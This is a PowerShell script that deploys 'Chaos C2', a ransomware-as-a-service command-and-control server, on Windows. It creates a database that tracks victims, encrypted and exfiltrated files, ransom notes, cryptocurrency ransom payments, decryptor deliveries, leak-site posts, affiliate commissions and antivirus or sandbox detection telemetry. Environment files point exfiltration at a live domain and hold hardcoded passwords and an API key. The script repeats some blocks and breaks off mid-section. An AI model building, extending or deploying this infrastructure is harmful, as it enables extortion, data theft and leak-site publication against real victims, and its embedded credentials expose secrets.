<#
.SYNOPSIS
    Chaos C2 RaaS - Complete Windows Server 2022 Deployment
    Run as Administrator in PowerShell
#>

param(
    [string]$Domain = "bytebane.duckdns.org",
    [string]$Email = "testtestacc54@gmail.com",
    [string]$EtherscanApiKey = "1HIQA3DFPH7EBX4B4Y4ICHGJTVVK41Q21R"
)

# =====================================================================
# CONFIGURATION
# =====================================================================
$Domain = "bytebane.duckdns.org"
$Email = "testtestacc54@gmail.com"
$EtherscanApiKey = "1HIQA3DFPH7EBX4B4Y4ICHGJTVVK41Q21R"
$MasterApiKey = "sk_admin_" + [Guid]::NewGuid().ToString("N").Substring(0,32)
$CampaignId = "camp_" + [Guid]::NewGuid().ToString("N").Substring(0,12)
$CampaignName = "Operation_" + [Guid]::NewGuid().ToString("N").Substring(0,4).ToUpper()
$BasePath = "C:\ByteBane Server"

# =====================================================================
# FUNCTIONS
# =====================================================================
function Write-Log { param([string]$m) Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $m" -Fore Cyan }
function Write-Success { param([string]$m) Write-Host "✓ $m" -Fore Green }
function Write-Warn { param([string]$m) Write-Host "⚠ $m" -Fore Yellow }
function Write-ErrorMsg { param([string]$m) Write-Host "✗ $m" -Fore Red }
function Write-Step { param([string]$m) Write-Host "`n=== $m ===" -Fore Magenta }
function Write-Log { param([string]$m) Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $m" -Fore Cyan }

# =====================================================================
# MAIN - MUST RUN AS ADMIN
# =====================================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "✗ Run as Administrator!" -Fore Red; exit 1
}

Write-Host "`n=== CHAOS C2 DEPLOYMENT START ===`n" -Fore Magenta

# Refresh PATH after Chocolatey installs
function Refresh-Path {
    $env:Path = [Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [Environment]::GetEnvironmentVariable("Path","User")
}

# =====================================================================
# PHASE 1: PREREQUISITES
# =====================================================================
Write-Step "PHASE 1: PREREQUISITES"

if (-not (Get-Command choco -ea 0)) {
    Write-Log "Installing Chocolatey..."
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
    Refresh-Path
}

$packages = "git","nodejs-lts","python3","openssl","7zip","curl","wget","jq","sql-server-express","dotnet-8.0-sdk"
$packages | ForEach { Write-Host "Installing $_..." -Fore Cyan; choco install -y $_ --no-progress --limit-output }
Refresh-Path
Write-Success "Packages installed"

# =====================================================================
# PHASE 2: IIS
# =====================================================================
Write-Step "PHASE 2: IIS INSTALLATION"

$iisFeatures = @(
    "IIS-WebServerRole","IIS-WebServer","IIS-CommonHttpFeatures","IIS-HttpErrors","IIS-HttpRedirect",
    "IIS-ApplicationDevelopment","IIS-NetFxExtensibility45","IIS-NetFxExtensibility",
    "IIS-HealthAndDiagnostics","IIS-HttpLogging","IIS-LoggingLibraries","IIS-RequestMonitor",
    "IIS-Security","IIS-RequestFiltering","IIS-Performance","IIS-WebServerManagementTools",
    "IIS-ManagementConsole","IIS-ManagementScriptingTools","IIS-ManagementService",
    "WAS-WindowsActivationService","WAS-ProcessModel","WAS-NetFxEnvironment","WAS-ConfigurationAPI"
)

$iisFeatures | ForEach { 
    Write-Log "Enabling $_..."
    dism /online /enable-feature /featurename:$_ /all /norestart | Out-Null
}

# URL Rewrite & ARR
if (-not (Test-Path "C:\Program Files\IIS\URL Rewrite")) {
    Write-Log "Installing URL Rewrite..."
    iwr 'https://download.microsoft.com/download/1/2/8/128E2E22-C1B9-44A4-BE2A-5859ED1D4592/rewrite_amd64_en-US.msi' -OutFile "C:\Temp\rewrite.msi"
    Start-Process msiexec.exe -ArgumentList '/i C:\Temp\rewrite.msi /quiet' -Wait
}
if (-not (Test-Path "C:\Program Files\IIS\Application Request Routing")) {
    iwr 'https://download.microsoft.com/download/4/7/5/47593F96-E1DE-4DEB-BDB2-2F0E662A5E11/ARRv3_setup_amd64_en-us.msi' -OutFile "C:\Temp\arr.msi"
    Start-Process msiexec.exe -ArgumentList '/i C:\Temp\arr.msi /quiet' -Wait
}

# ASP.NET Core Hosting Bundle (updated URL)
iwr 'https://download.visualstudio.microsoft.com/download/pr/7d1e5b4e-8c5a-4b7f-8b3e-4b5c6d7e8f9a/aspnetcore-hosting-8.0.6-win.exe' -OutFile "C:\Temp\hosting.exe"
Start-Process C:\Temp\hosting.exe -ArgumentList '/quiet /norestart' -Wait

# Certbot (via chocolatey)
choco install -y certbot --no-progress
Refresh-Path

Write-Success "IIS installed"

# =====================================================================
# DIRECTORIES & PERMISSIONS
# =====================================================================
Write-Step "DIRECTORIES & PERMISSIONS"
$dirs = @(
    "C:\ByteBane Server",
    "C:\ByteBane Server\App",
    "C:\ByteBane Server\App\Dashboard",
    "C:\ByteBane Server\App\Affiliate",
    "C:\ByteBane Server\App\Api",
    "C:\ByteBane Server\App\Keys",
    "C:\ByteBane Server\Data",
    "C:\ByteBane Server\Data\Logs",
    "C:\ByteBane Server\Data\Sql",
    "C:\ByteBane Server\Backups",
    "C:\ByteBane Server\Certs",
    "C:\ByteBane Server\Temp",
    "C:\ByteBane Server\Config",
    "C:\ByteBane Server\Scripts"
)
$dirs | ForEach { if (-not (Test-Path $_)) { mkdir $_ -Force | Out-Null; Write-Log "Created: $_" } }
icacls "C:\ByteBane Server" /grant "IIS_IUSRS:(OI)(CI)F" /T | Out-Null
Write-Success "Directory structure created"

# =====================================================================
# SQL SERVER
# =====================================================================
Write-Step "SQL SERVER SETUP"
Write-Log "Waiting for SQL Server to be ready..."
Start-Sleep 30

# Use full path to sqlcmd
$sqlcmdPath = "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe"
if (-not (Test-Path $sqlcmdPath)) {
    $sqlcmdPath = "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe"
}
if (-not (Test-Path $sqlcmdPath)) {
    # Try from SQL Server installation
    $sqlcmdPath = "C:\Program Files\Microsoft SQL Server\150\Tools\Binn\sqlcmd.exe"
}
if (-not (Test-Path $sqlcmdPath)) {
    # Add to PATH and try
    $env:Path += ";C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn;C:\Program Files\Microsoft SQL Server\150\Tools\Binn"
    $sqlcmdPath = "sqlcmd"
}

Write-Log "Creating database and schema..."
$sql = @"
IF NOT EXISTS (SELECT * FROM sys.databases WHERE name = 'ChaosC2')
BEGIN CREATE DATABASE ChaosC2; END

IF NOT EXISTS (SELECT * FROM sys.server_principals WHERE name = 'chaos_app')
BEGIN
    CREATE LOGIN chaos_app WITH PASSWORD = 'ChaosApp_2024!SecurePass';
    CREATE USER chaos_app FOR LOGIN chaos_app;
END

IF NOT EXISTS (SELECT * FROM sys.server_principals WHERE name = 'chaos_affiliate')
BEGIN
    CREATE LOGIN chaos_affiliate WITH PASSWORD = 'ChaosAff_2024!SecurePass';
    CREATE USER chaos_affiliate FOR LOGIN chaos_affiliate;
END
"@

& $sqlcmdPath -S "localhost\CHAOS" -Q $sql -b
Write-Success "Database and logins created"

# Schema
$schemaSql = @"
IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Campaigns')
BEGIN
    CREATE TABLE Campaigns (
        Id NVARCHAR(64) PRIMARY KEY,
        Name NVARCHAR(256) NOT NULL,
        ApiKey NVARCHAR(128) NOT NULL UNIQUE,
        RsaKeySize INT NOT NULL DEFAULT 4096,
        PublicKeyPem NVARCHAR(MAX),
        PrivateKeyPem NVARCHAR(MAX),
        Status NVARCHAR(32) NOT NULL DEFAULT 'active',
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        UpdatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        AffiliateId NVARCHAR(64),
        Settings NVARCHAR(MAX)
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Systems')
BEGIN
    CREATE TABLE Systems (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(256) NOT NULL,
        CampaignId NVARCHAR(64) NOT NULL REFERENCES Campaigns(Id),
        Hostname NVARCHAR(256),
        Username NVARCHAR(256),
        OS NVARCHAR(256),
        IP NVARCHAR(64),
        Country NVARCHAR(128),
        City NVARCHAR(128),
        ISP NVARCHAR(256),
        Status NVARCHAR(32) NOT NULL DEFAULT 'active',
        FirstSeen DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        LastSeen DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        Version INT NOT NULL DEFAULT 1,
        Tags NVARCHAR(MAX)
    );
    CREATE INDEX IX_Systems_CampaignId ON Systems(CampaignId);
    CREATE INDEX IX_Systems_Status ON Systems(Status);
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'SystemStats')
BEGIN
    CREATE TABLE SystemStats (
        SystemId NVARCHAR(64) PRIMARY KEY REFERENCES Systems(Id),
        FilesEncrypted BIGINT NOT NULL DEFAULT 0,
        FilesExfiltrated BIGINT NOT NULL DEFAULT 0,
        BytesExfiltrated BIGINT NOT NULL DEFAULT 0,
        RansomNoteDropped BIT NOT NULL DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Files')
BEGIN
    CREATE TABLE Files (
        Id NVARCHAR(64) PRIMARY KEY,
        SystemId NVARCHAR(64) NOT NULL REFERENCES Systems(Id),
        CampaignId NVARCHAR(64) NOT NULL REFERENCES Campaigns(Id),
        FileName NVARCHAR(512) NOT NULL,
        FileExt NVARCHAR(32),
        Size BIGINT NOT NULL,
        UploadedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        ContentType NVARCHAR(128),
        StorageType NVARCHAR(32) NOT NULL DEFAULT 'sql',
        StorageProvider NVARCHAR(64),
        StorageKey NVARCHAR(256),
        StorageUrl NVARCHAR(512),
        Hash NVARCHAR(64),
        Chunked BIT NOT NULL DEFAULT 0
    );
    CREATE INDEX IX_Files_SystemId ON Files(SystemId);
    CREATE INDEX IX_Files_CampaignId ON Files(CampaignId);
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'CampaignStats')
BEGIN
    CREATE TABLE CampaignStats (
        CampaignId NVARCHAR(64) PRIMARY KEY REFERENCES Campaigns(Id),
        TotalInfections BIGINT NOT NULL DEFAULT 0,
        TotalFiles BIGINT NOT NULL DEFAULT 0,
        TotalBytes BIGINT NOT NULL DEFAULT 0,
        LastActivity DATETIME2,
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME()
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'DailyStats')
BEGIN
    CREATE TABLE DailyStats (
        Id INT IDENTITY(1,1) PRIMARY KEY,
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        StatDate DATE NOT NULL,
        Infections BIGINT NOT NULL DEFAULT 0,
        Uploads BIGINT NOT NULL DEFAULT 0,
        Bytes BIGINT NOT NULL DEFAULT 0,
        UNIQUE(CampaignId, StatDate)
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'ExtensionStats')
BEGIN
    CREATE TABLE ExtensionStats (
        Id INT IDENTITY(1,1) PRIMARY KEY,
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        Ext NVARCHAR(32) NOT NULL,
        Count BIGINT NOT NULL DEFAULT 0,
        UNIQUE(CampaignId, Ext)
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Affiliates')
BEGIN
    CREATE TABLE Affiliates (
        Id NVARCHAR(64) PRIMARY KEY,
        Username NVARCHAR(128) NOT NULL UNIQUE,
        Email NVARCHAR(256),
        WalletAddress NVARCHAR(256),
        ReferralCode NVARCHAR(64) NOT NULL UNIQUE,
        CommissionRate INT NOT NULL DEFAULT 70,
        TotalEarnings DECIMAL(18,2) NOT NULL DEFAULT 0,
        PendingEarnings DECIMAL(18,2) NOT NULL DEFAULT 0,
        PaidEarnings DECIMAL(18,2) NOT NULL DEFAULT 0,
        CampaignCount INT NOT NULL DEFAULT 0,
        InfectionCount INT NOT NULL DEFAULT 0,
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        LastLogin DATETIME2,
        Status NVARCHAR(32) NOT NULL DEFAULT 'active'
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Referrals')
BEGIN
    CREATE TABLE Referrals (
        Id NVARCHAR(64) PRIMARY KEY,
        ReferrerId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        ReferredId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        Tier INT NOT NULL DEFAULT 1,
        CommissionEarned DECIMAL(18,2) NOT NULL DEFAULT 0,
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME()
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Payouts')
BEGIN
    CREATE TABLE Payouts (
        Id NVARCHAR(64) PRIMARY KEY,
        AffiliateId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        Amount DECIMAL(18,2) NOT NULL,
        WalletAddress NVARCHAR(256) NOT NULL,
        Status NVARCHAR(32) NOT NULL DEFAULT 'pending',
        TxHash NVARCHAR(128),
        RequestedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        CompletedAt DATETIME2,
        NetworkFee DECIMAL(18,2) NOT NULL DEFAULT 0,
        NetAmount DECIMAL(18,2) NOT NULL DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Tickets')
BEGIN
    CREATE TABLE Tickets (
        Id NVARCHAR(64) PRIMARY KEY,
        AffiliateId NVARCHAR(64) NOT NULL REFERENCES Affiliates(Id),
        Subject NVARCHAR(512) NOT NULL,
        Status NVARCHAR(32) NOT NULL DEFAULT 'open',
        Priority NVARCHAR(32) NOT NULL DEFAULT 'medium',
        Category NVARCHAR(64) NOT NULL DEFAULT 'technical',
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        UpdatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        LastReplyAt DATETIME2
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'TicketReplies')
BEGIN
    CREATE TABLE TicketReplies (
        Id NVARCHAR(64) PRIMARY KEY,
        TicketId NVARCHAR(64) NOT NULL REFERENCES Tickets(Id),
        Author NVARCHAR(32) NOT NULL,
        AuthorName NVARCHAR(128),
        Message NVARCHAR(MAX) NOT NULL,
        Attachments NVARCHAR(MAX),
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        Internal BIT NOT NULL DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'AuditLog')
BEGIN
    CREATE TABLE AuditLog (
        Id NVARCHAR(64) PRIMARY KEY,
        ActorId NVARCHAR(64),
        ActorRole NVARCHAR(32),
        Action NVARCHAR(128) NOT NULL,
        ResourceType NVARCHAR(64),
        ResourceId NVARCHAR(64),
        Details NVARCHAR(MAX),
        Severity NVARCHAR(32) NOT NULL DEFAULT 'info',
        IP NVARCHAR(64),
        UserAgent NVARCHAR(512),
        Timestamp DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME()
    );
    CREATE INDEX IX_AuditLog_ActorId ON AuditLog(ActorId);
    CREATE INDEX IX_AuditLog_Action ON AuditLog(Action);
    CREATE INDEX IX_AuditLog_Timestamp ON AuditLog(Timestamp);
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Payments')
BEGIN
    CREATE TABLE Payments (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(64),
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        Currency NVARCHAR(16) NOT NULL,
        WalletAddress NVARCHAR(256) NOT NULL,
        AmountUsd DECIMAL(18,2) NOT NULL,
        AmountCrypto DECIMAL(18,8) NOT NULL,
        Status NVARCHAR(32) NOT NULL DEFAULT 'pending',
        TxHash NVARCHAR(128),
        BlockHeight BIGINT,
        Confirmations INT NOT NULL DEFAULT 0,
        RequiredConfirmations INT NOT NULL DEFAULT 3,
        RegisteredAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        ConfirmedAt DATETIME2,
        LastChecked DATETIME2
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'DecryptorDeliveries')
BEGIN
    CREATE TABLE DecryptorDeliveries (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(64),
        CampaignId NVARCHAR(64),
        PaymentId NVARCHAR(64),
        DeliveredAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        Status NVARCHAR(32) NOT NULL DEFAULT 'delivered'
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'LeakPosts')
BEGIN
    CREATE TABLE LeakPosts (
        Id NVARCHAR(64) PRIMARY KEY,
        VictimId NVARCHAR(64),
        CampaignId NVARCHAR(64),
        Title NVARCHAR(512),
        Content NVARCHAR(MAX),
        Files NVARCHAR(MAX),
        TotalFiles INT,
        TotalSize BIGINT,
        Status NVARCHAR(32) NOT NULL DEFAULT 'draft',
        CreatedAt DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        PublishedAt DATETIME2,
        Views INT DEFAULT 0,
        Downloads INT DEFAULT 0
    );
END

IF NOT EXISTS (SELECT * FROM sys.tables WHERE name = 'Telemetry')
BEGIN
    CREATE TABLE Telemetry (
        Id NVARCHAR(64) PRIMARY KEY,
        SystemId NVARCHAR(64) REFERENCES Systems(Id),
        CampaignId NVARCHAR(64) REFERENCES Campaigns(Id),
        Timestamp DATETIME2 NOT NULL DEFAULT SYSUTCDATETIME(),
        AvDetections NVARCHAR(MAX),
        EdrProducts NVARCHAR(MAX),
        SandboxDetected BIT,
        SandboxName NVARCHAR(128),
        VmArtifacts NVARCHAR(MAX),
        NetworkIndicators NVARCHAR(MAX),
        SignatureMatches NVARCHAR(MAX),
        YaraMatches NVARCHAR(MAX),
        RiskScore INT
    );
END

IF NOT EXISTS (SELECT * FROM Affiliates WHERE Username = 'admin')
BEGIN
    INSERT INTO Affiliates (Id, Username, Email, WalletAddress, ReferralCode, CommissionRate, Status)
    VALUES ('aff_admin', 'admin', 'admin@bytebane.duckdns.org', '', 'CHAOS-ADMIN-' + CONVERT(NVARCHAR(8), NEWID()), 100, 'active');
END
"@

# Execute schema
if (Test-Path "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe") {
    & "C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe" -S "localhost\CHAOS" -Database "ChaosC2" -Query $schemaSql -b
} elseif (Test-Path "C:\Program Files\Microsoft SQL Server\150\Tools\Binn\sqlcmd.exe") {
    & "C:\Program Files\Microsoft SQL Server\150\Tools\Binn\sqlcmd.exe" -S "localhost\CHAOS" -Database "ChaosC2" -Query $schemaSql -b
} else {
    $env:Path += ";C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn;C:\Program Files\Microsoft SQL Server\150\Tools\Binn"
    sqlcmd -S "localhost\CHAOS" -Database "ChaosC2" -Query $schemaSql -b
}
Write-Success "Database schema applied"

# =====================================================================
# APPLICATION DEPLOY
# =====================================================================
Write-Step "APPLICATION DEPLOY"
Refresh-Path

if (-not (Test-Path "C:\ByteBane Server\App\vercel-dashboard\.git")) { 
    Write-Log "Cloning application..."
    git clone https://github.com/BaneGPT/vercel-dashboard.git "C:\ByteBane Server\App\vercel-dashboard" 
}
Write-Success "Application cloned"

# Build Dashboard
Write-Log "Building Dashboard frontend..."
cd "C:\ByteBane Server\App\vercel-dashboard\dashboard"
npm install --production
Write-Success "Dashboard dependencies installed"

# Build Affiliate Portal
Write-Log "Building Affiliate Portal..."
cd "C:\ByteBane Server\App\vercel-dashboard\affiliate-portal"
npm install --production
npm run build
Write-Success "Affiliate portal built"

# Copy to web root
Write-Log "Copying files to web root..."
Copy-Item "C:\ByteBane Server\App\vercel-dashboard\dashboard" "C:\ByteBane Server\App\Dashboard" -Recurse -Force
Copy-Item "C:\ByteBane Server\App\vercel-dashboard\affiliate-portal\.next" "C:\ByteBane Server\App\Affiliate" -Recurse -Force
Copy-Item "C:\ByteBane Server\App\vercel-dashboard\api" "C:\ByteBane Server\App\Api" -Recurse -Force
Write-Success "Files copied to web root"

# =====================================================================
# NODE.JS API SERVICES
# =====================================================================
Write-Step "NODE.JS API SERVICES"
cd "C:\ByteBane Server\App\Api"
npm install --production
Write-Success "API dependencies installed"

# Service entry points
$apiIndex = @"
const http = require('http');
const app = require('./app');
const port = process.env.PORT || 3000;
app.listen(port, () => console.log('API on ' + port));
"@
Set-Content "C:\ByteBane Server\App\Api\index.js" -Value $apiIndex -Encoding UTF8

$realtimeJs = @"
const http = require('http');
const app = require('./realtime');
const port = process.env.PORT || 3001;
app.listen(port, () => console.log('Realtime on ' + port));
"@
Set-Content "C:\ByteBane Server\App\Api\realtime.js" -Value $realtimeJs -Encoding UTF8

$affiliateServer = @"
const next = require('next');
const dev = process.env.NODE_ENV !== 'production';
const app = next({ dev, dir: 'C:\ByteBane Server\App\Affiliate' });
const handle = app.getRequestHandler();
app.prepare().then(() => {
  const server = require('http').createServer((req, res) => handle(req, res));
  server.listen(3002, () => console.log('Affiliate on 3002'));
});
"@
Set-Content "C:\ByteBane Server\App\Affiliate\server.js" -Value $affiliateServer -Encoding UTF8

cd "C:\ByteBane Server\App\Api"
npm install --production
Write-Success "API dependencies installed"

# Windows Services
$svcs = @(
    @{N="ChaosAPI"; D="Chaos C2 API"; P="C:\Program Files\nodejs\node.exe"; A="`"C:\ByteBane Server\App\Api\index.js`""}
    @{N="ChaosRealtime"; D="Chaos C2 Realtime"; P="C:\Program Files\nodejs\node.exe"; A="`"C:\ByteBane Server\App\Api\realtime.js`""}
    @{N="ChaosAffiliate"; D="Chaos Affiliate Portal"; P="C:\Program Files\nodejs\node.exe"; A="`"C:\ByteBane Server\App\Affiliate\server.js`""}
)

foreach ($svc in $svcs) {
    $bp = "$($svc.P) $($svc.A)"
    if (-not (Get-Service $svc.N -ea 0)) { 
        New-Service -Name $svc.N -BinaryPathName $bp -DisplayName $svc.D -Desc "Chaos C2 Service" -StartupType Auto
        Write-Log "Created service: $($svc.N)"
    }
}
Write-Success "Windows services created"

# =====================================================================
# IIS SITES
# =====================================================================
Write-Step "IIS CONFIGURATION"

# Ensure appcmd is in path
$env:Path += ";C:\Windows\System32\inetsrv"

appcmd stop site /site.name:"Default Web Site" 2>$null

appcmd add site /name:"ChaosDashboard" /bindings:http/*:80: /physicalPath:"C:\ByteBane Server\App\Dashboard" | Out-Null
appcmd set app "ChaosDashboard/" /applicationPool:"ChaosDashboard" | Out-Null

appcmd add site /name:"ChaosAffiliate" /bindings:http/*:8080: /physicalPath:"C:\ByteBane Server\App\Affiliate" | Out-Null
appcmd set app "ChaosAffiliate/" /applicationPool:"ChaosAffiliate" | Out-Null

appcmd add site /name:"ChaosAPI" /bindings:http/*:3000: /physicalPath:"C:\ByteBane Server\App\Api" | Out-Null
appcmd set app "ChaosAPI/" /applicationPool:"ChaosAPI" | Out-Null

appcmd add site /name:"ChaosRealtime" /bindings:http/*:3001: /physicalPath:"C:\ByteBane Server\App\Api" | Out-Null
appcmd set app "ChaosRealtime/" /applicationPool:"ChaosRealtime" | Out-Null

# App Pools
@("ChaosDashboard","ChaosAffiliate","ChaosAPI","ChaosRealtime") | ForEach {
    if (-not (Get-Item "IIS:\AppPools\$_" -ErrorAction SilentlyContinue)) {
        appcmd add apppool /name:$_ /managedRuntimeVersion:"" /managedPipelineMode:Integrated | Out-Null
        appcmd set apppool $_ /processModel.identityType:ApplicationPoolIdentity | Out-Null
        appcmd set apppool $_ /processModel.idleTimeout:00:00:00 | Out-Null
    }
}

# URL Rewrite rules
Import-Module WebAdministration

@("ChaosDashboard","ChaosAffiliate") | ForEach {
    Add-WebConfigurationProperty -pspath "MACHINE/WEBROOT/APPHOST/$_" -filter 'system.webServer/rewrite/rules' -name '.' -value @{name='API Proxy'; stopProcessing=$true; patternSyntax='ECMAScript'} -ea 0
    Set-WebConfigurationProperty -pspath "MACHINE/WEBROOT/APPHOST/$_" -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/match" -name 'url' -value '^api/(.*)'
    Set-WebConfigurationProperty -pspath "MACHINE/WEBROOT/APPHOST/$_" -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/action" -name 'type' -value 'Rewrite'
    Set-WebConfigurationProperty -pspath "MACHINE/WEBROOT/APPHOST/$_" -filter "system.webServer/rewrite/rules/rule[@name='API Proxy']/action" -name 'url' -value 'http://localhost:3000/{R:1}'
}

Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter 'system.webServer/rewrite/rules' -name '.' -value @{name='Realtime Proxy'; stopProcessing=$true; patternSyntax='ECMAScript'} -ea 0
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='Realtime Proxy']/match" -name 'url' -value '^realtime/(.*)'
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='Realtime Proxy']/action" -name 'type' -value 'Rewrite'
Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/ChaosDashboard' -filter "system.webServer/rewrite/rules/rule[@name='Realtime Proxy']/action" -name 'url' -value 'http://localhost:3001/{R:1}'

Write-Success "IIS configured with URL Rewrite"

# =====================================================================
# SSL (DuckDNS)
# =====================================================================
Write-Step "SSL CONFIGURATION"
certbot certonly --webroot -w "C:\ByteBane Server\App\Dashboard" -d bytebane.duckdns.org -d www.bytebane.duckdns.org --email testtestacc54@gmail.com --agree-tos --non-interactive --force-renewal

if (Test-Path "C:\Certbot\live\bytebane.duckdns.org\fullchain.pem") {
    $c = Get-PfxCertificate "C:\Certbot\live\bytebane.duckdns.org\fullchain.pem"
    netsh http add sslcert ipport=0.0.0.0:443 certhash=$c.Thumbprint appid={$([guid]::NewGuid())} | Out-Null
    netsh http add sslcert ipport=0.0.0.0:8443 certhash=$c.Thumbprint appid={$([guid]::NewGuid())} | Out-Null
    
    appcmd set site /site.name:"ChaosDashboard" /+bindings.[protocol='https',bindingInformation='*:443:'] | Out-Null
    appcmd set site /site.name:"ChaosAffiliate" /+bindings.[protocol='https',bindingInformation='*:8443:'] | Out-Null
    Write-Success "SSL configured"
} else {
    Write-Warn "SSL cert not obtained - continuing with HTTP"
}

# =====================================================================
# ENV FILES
# =====================================================================
Write-Step "ENVIRONMENT CONFIGURATION"

$apiEnv = @"
NODE_ENV=production
PORT=3000
DB_SERVER=localhost\CHAOS
DB_DATABASE=ChaosC2
DB_USER=chaos_app
DB_PASSWORD=ChaosApp_2024!SecurePass
DB_ENCRYPT=false
DB_TRUST_SERVER_CERTIFICATE=true
MASTER_API_KEY=sk_admin_$([Guid]::NewGuid().ToString("N").Substring(0,32))
CAMPAIGN_ID=camp_$([Guid]::NewGuid().ToString("N").Substring(0,12))
CAMPAIGN_NAME=Operation_$([Guid]::NewGuid().ToString("N").Substring(0,4).ToUpper())
EXFIL_SERVER_URL=https://bytebane.duckdns.org
EXTERNAL_STORAGE_PROVIDER=r2
BTC_API_URL=https://blockstream.info/api
XMR_API_URL=https://xmrchain.net/api
ETHERSCAN_API_URL=https://api.etherscan.io/api
ETHERSCAN_API_KEY=1HIQA3DFPH7EBX4B4Y4ICHGJTVVK41Q21R
TRONSCAN_API_URL=https://apilist.tronscan.org/api
"@
Set-Content "C:\ByteBane Server\App\Api\.env" -Value $apiEnv -Encoding UTF8

$affiliateEnv = @"
NODE_ENV=production
PORT=3002
NEXT_PUBLIC_API_URL=https://bytebane.duckdns.org
NEXT_PUBLIC_APP_URL=https://bytebane.duckdns.org
NEXT_PUBLIC_WS_URL=wss://bytebane.duckdns.org
"@
Set-Content "C:\ByteBane Server\App\Affiliate\.env" -Value $affiliateEnv -Encoding UTF8
Write-Success "Environment files created"

# =====================================================================
# FIREWALL
# =====================================================================
Write-Step "FIREWALL CONFIGURATION"
netsh advfirewall set allprofiles state on | Out-Null
$ports = 80,443,3000,3001,3002,8080,8443,1433,3389,5985,5986
$ports | ForEach { netsh advfirewall firewall add rule name="Chaos $_" dir=in action=allow protocol=TCP localport=$_ | Out-Null }
Write-Success "Firewall configured"

# =====================================================================
# START SERVICES
# =====================================================================
Write-Step "STARTING SERVICES"

net start w3svc 2>$null
net start MSSQL$CHAOS 2>$null

# Start Node.js services
$svcs = @(
    @{N="ChaosAPI"; P="C:\Program Files\nodejs\node.exe"; A="`"C:\ByteBane Server\App\Api\index.js`""}
    @{N="ChaosRealtime"; P="C:\Program Files\nodejs\node.exe"; A="`"C:\ByteBane Server\App\Api\realtime.js`""}
    @{N="ChaosAffiliate"; P="C:\Program Files\nodejs\node.exe"; A="`"C:\ByteBane Server\App\Affiliate\server.js`""}
)

foreach ($svc in $svcs) {
    $bp = "$($svc.P) $($svc.A)"
    if (-not (Get-Service $svc.N -ea 0)) { 
        New-Service -Name $svc.N -BinaryPathName $bp -DisplayName $svc.D -Desc "Chaos C2 Service" -StartupType Auto
    }
    net start $svc.N 2>$null
}

Start-Sleep 10

# Create service entry points
$apiIndex = @"
const http = require('http');
const app = require('./app');
